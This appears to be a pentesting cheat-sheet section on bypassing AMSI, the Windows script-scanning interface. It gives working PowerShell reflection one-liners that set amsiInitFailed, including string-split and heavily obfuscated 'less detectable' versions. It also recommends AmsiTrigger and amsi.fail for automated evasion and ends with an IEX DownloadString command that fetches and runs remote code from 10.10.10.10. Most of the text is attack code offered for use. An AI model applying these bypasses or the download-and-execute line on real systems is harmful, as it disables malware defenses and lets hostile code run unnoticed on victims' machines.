#### AMSI (Anti Malware Scan Interface)
AMSI is a Powershell feature that scans payloads before execution during runtime.
It's fully integrated with:
-  Powershell
-  VBScript
-  Windows script hosts (wscript, cscript)
-  Office VBA macros
If you are getting errors saying  
```
This script contains malicious content and has been blocked by your antivirus software.
		+ CategoryInfo          : ParserError: (:) []. ParentContainsErrorRecordException
		+ FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
It's AMSI.

### Automated exploitation
For commands, visit [amsi.fail](http://amsi.fail)
Or use AmsiTrigger:
```
AmsiTrigger_x64.exe -i "bypass.ps1" -f 3      // Finds and bypasses the AMSI triggers
```


One-liner to bypass AMSI using Powershell reflection (can get detected):
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

// Explanation
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')   // Gets the AMSI-utilities in Powershell
.GetField('amsiInitFailed','NonPublic,Static')                     // Get a specific field from the AMSI-utils section
.SetValue($null,$true)                                             // Sets "amsiInitFailed" to True, so it will stop being checked
```

Less detectable:
```powershell
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```

Even less detectable (recommended):

```powershell
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Test using:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/test')
```

Sometimes works: https://amsi.fail/
